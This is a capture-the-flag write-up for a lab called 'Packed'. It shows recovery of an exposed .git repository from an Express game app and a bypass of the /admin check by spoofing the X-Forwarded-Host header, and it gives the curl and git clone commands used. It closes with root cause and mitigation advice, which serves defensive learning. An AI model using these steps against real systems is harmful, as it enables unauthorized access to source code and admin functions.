---
title: "Exposed Git Repository Leads to Header-Based Admin Bypass | Packed"
date: 2026-07-13 11:30:00 +0530
categories: [A02 - Security Misconfiguration, Information Disclosure]
tags: [information-disclosure, exposed-git, access-control-bypass, header-spoofing, express, webverse, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/packed-exposed-git-header-access-control-bypass.webp
  alt: "Packed exposed Git repository and header-based admin bypass"
---

## Lab Link

[Packed](https://dashboard.webverselabs-pro.com/mystery-challenges/packed)

---

## Overview

**Packed** was a WebVerse Pro challenge built around a small Express-based arcade game application.

At first glance, the application looked like a simple Chomp/Pac-Man style game with score telemetry and a scoreboard API. Initial testing showed that the game accepted client-controlled state updates, but spoofing high scores did not expose the flag.

Further route discovery revealed an `/admin` endpoint protected by an access-control check. The real issue was found after discovering that the live server exposed its `.git` repository. By recovering the source code, it became clear that the admin gate trusted the wrong forwarded header.

The application attempted to restrict `/admin` access based on an internal/operator address, but it compared `X-Forwarded-Host` against a trusted IP value. Since this header was fully user-controllable, sending the expected value unlocked the admin page and revealed the flag.

---

## Objective

The goal was to identify the hidden vulnerability, bypass the admin restriction, and retrieve the flag from the protected admin console.

---

## Vulnerability Identification

The vulnerability chain consisted of two issues:

1. **Exposed `.git` repository**
   - The server exposed `/.git/HEAD`.
   - This allowed recovering the application repository from the live deployment.

2. **Header-based access control bypass**
   - The recovered source showed that `/admin` was protected by an `ownerOnly` style check.
   - The check trusted the `X-Forwarded-Host` header.
   - The expected value was `203.0.113.7`.
   - Because the client could supply this header directly, the restriction was bypassable.

This made the exposed Git repository the discovery vector and the trusted-header mistake the final access-control flaw.

---

## Recon and Approach

The first step was to inspect the public application.

```bash
curl -i -L https://<redacted-lab-host>/
```

The application returned a small Express-based arcade game. Client-side JavaScript hinted at API-driven game state handling, so the static assets and API endpoints were reviewed.

A telemetry endpoint was identified:

```http
POST /api/state HTTP/2
Host: <redacted-lab-host>
Content-Type: application/json
```

A browser-shaped request returned a successful heartbeat response:

```json
{
  "sid": "0123456789abcdef",
  "alias": "PELLET-AA",
  "score": 0,
  "level": 1,
  "lives": 3,
  "status": "READY"
}
```

The server accepted valid telemetry and returned `204 No Content`, but manipulating scores and game state did not reveal the flag.

A targeted route sweep then identified interesting routes:

```text
/admin
/api/state
/api/scores
/.git/HEAD
```

The `/admin` route existed but returned a branded `403` operator-console response.

The key discovery was the exposed Git metadata:

```bash
curl -i https://<redacted-lab-host>/.git/HEAD
```

A valid Git reference confirmed that the repository metadata was exposed.

---

## Exploitation

### Step 1: Recover the Exposed Repository

Since `/.git/HEAD` was accessible, the deployed repository could be recovered.

```bash
git clone https://<redacted-lab-host>/.git recovered-site
```

After cloning the repository, the source code and commit history were reviewed.

```bash
cd recovered-site
git log --oneline
```

The recovered code showed that the flag was not stored directly in the static client files. Instead, the admin page rendered the flag from an environment variable:

```js
process.env.FLAG
```

This meant the flag had to be retrieved through the protected `/admin` route.

---

### Step 2: Inspect the Admin Gate

The source revealed that `/admin` was protected by a custom access check.

The intended logic appeared to restrict access to a trusted internal/operator address. However, the implementation trusted the wrong user-controllable header:

```js
req.get("X-Forwarded-Host") === "203.0.113.7"
```

This was a security mistake because `X-Forwarded-Host` is not a reliable client identity signal. Unless a trusted reverse proxy strips and rewrites this header, an attacker can supply it directly.

---

### Step 3: Spoof the Trusted Header

With the required value known from the recovered source, the admin route could be requested with the spoofed header:

```bash
curl -i -s https://<redacted-lab-host>/admin \
  -H "X-Forwarded-Host: 203.0.113.7"
```

The server accepted the spoofed header and returned the protected admin console.

---

## Proof and Flag

The final request used the spoofed `X-Forwarded-Host` header to access `/admin`.

```http
GET /admin HTTP/2
Host: <redacted-lab-host>
X-Forwarded-Host: 203.0.113.7
```

The response contained the flag:

```text
WEBVERSE{REDACTED}
```

---

## Root Cause

The root cause was a combination of deployment misconfiguration and insecure access-control logic.

The application exposed its Git repository on the production web server. This leaked implementation details, including how the admin authorization check worked.

The admin check then relied on a request header controlled by the client. Since the server trusted `X-Forwarded-Host` directly, an attacker could forge the expected value and bypass the operator-only restriction.

---

## Impact

An attacker could:

- Recover the deployed application source code.
- Inspect hidden routes and authorization logic.
- Discover the exact header value required to access the admin console.
- Bypass the `/admin` restriction.
- Retrieve sensitive data exposed only to operators, including the flag.

In a real-world application, this pattern could expose source code, secrets, internal logic, administrative functionality, and production environment data.

---

## Mitigation

To prevent this issue:

- Never expose `.git` or other source-control metadata from a production web root.
- Block access to hidden development artifacts such as:
  - `.git/`
  - `.env`
  - backup files
  - source maps
  - deployment scripts
- Enforce admin access control using authenticated sessions and server-side authorization checks.
- Do not trust client-supplied forwarding headers directly.
- Only consume `X-Forwarded-*` headers from a trusted reverse proxy.
- Configure the reverse proxy to strip untrusted incoming forwarding headers.
- Use framework-level trusted proxy settings carefully and explicitly.
- Add deployment checks that fail builds if `.git` or secrets are present in the served directory.

